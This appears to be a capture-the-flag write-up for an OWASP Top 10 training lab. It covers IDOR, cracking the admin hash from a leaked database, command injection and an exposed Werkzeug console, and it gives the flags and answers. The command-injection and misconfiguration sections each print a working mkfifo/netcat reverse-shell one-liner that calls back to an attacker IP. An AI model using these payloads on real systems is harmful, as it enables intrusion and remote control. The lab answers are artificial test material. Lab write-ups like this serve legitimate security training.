# OWASP Top 10 - 2021

### Broken Access Control (IDOR Challenge)
- Look at other users' notes. What is the flag? <br />
Deploy the machine and go to http://IP_addr - Login with the username noot and the password test1234 <br />
Since we know this is an IDOR (Insecure Direct Object Reference) vulnerability, let's try to play with the URL: <br />
![image](https://github.com/user-attachments/assets/0f3fcfc2-75f7-450e-85bb-d5e39a775855) <br />
By using id=0, we have access to the flag: `flag{fivefourthree}`

### Cryptographic Failures (Challenge)
- Have a look around the web app. The developer has left themselves a note indicating that there is sensitive data in a specific directory. <br />
Go to http://IP_addr:81 and move to the login page<br />
![image](https://github.com/user-attachments/assets/4b133324-0c49-4fa2-bf78-08d166df2ba6) <br />
Now press CTRL+U to view the source code. There's something interesting: <br />
![image](https://github.com/user-attachments/assets/649e8bf0-d820-4d0a-8e70-d32047e42347) <br />
Now move to http://10.10.119.6:81/assets/ and download the `webapp.db` file. The file contains a "user" table, here's the content of it: <br />
![image](https://github.com/user-attachments/assets/8c9cdf0e-a137-4479-a2a6-04a172089bf3) <br />
Now use CrackStation to try and crack the admin password: <br />
![image](https://github.com/user-attachments/assets/1166d1ec-d3c4-4226-a182-28fd4a2bdbaf)<br />
- What is the name of the mentioned directory? `/assets`
- Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data? `webapp.db`
- Use the supporting material to access the sensitive data. What is the password hash of the admin user? `6eea9b7ef19179a06954edd0f6c05ceb`
- What is the admin's plaintext password? `qwertyuiop`
- Log in as the admin. What is the flag? `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`

### 3.1. Command Injection
To complete the questions below, navigate to http://10.10.119.6:82/ and exploit the cowsay server. <br />
Go to http://10.10.119.6:82. This web application is vulnerable to command injection. If we input $(whoami), it outputs "apache": <br />
![image](https://github.com/user-attachments/assets/ec5bedec-7581-4d7e-b877-fdda399b4894)<br />
Let's quickly get a reverse shell. Start listening on our machine with `nc -lnvp 4444`. The submit this payload to the application: `$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.85.53 4444 >/tmp/f)`. This will give us a reverse shell: <br />
![image](https://github.com/user-attachments/assets/aff5a3e7-6551-4e25-b304-40b02cd77b5e)<br />
- What strange text file is in the website's root directory? `drpepper.txt`
- How many non-root/non-service/non-daemon users are there? `0`
- What user is this app running as? `apache`
- What is the user's shell set as? `/sbin/nologin`
- What version of Alpine Linux is running? `3.16.0`

### 4. Insecure Design
- What is the value of the flag in joseph's account? <br />
Little hint: green. <br />
`THM{Not_3ven_c4tz_c0uld_sav3_U!}`

### 5. Security Misconfiguration
Here we can execute system commands on the Werkzeug console, for example: <br />
![image](https://github.com/user-attachments/assets/1da359b5-7968-46d2-b54e-c2afab4aa9af)<br />
Let's spawn a reverse shell. Start a netcat listener on your machine: `nc -lnvp 4444` and, from the image above, instead of "ls -l", type `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.85.53 4444 >/tmp/f` and spawn a shell: <br />
![image](https://github.com/user-attachments/assets/d556ab1c-f012-4329-a9d6-f938a26fd930)<br />
- What is the database file name (the one with the .db extension) in the current directory? `todo.db`
- Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code?










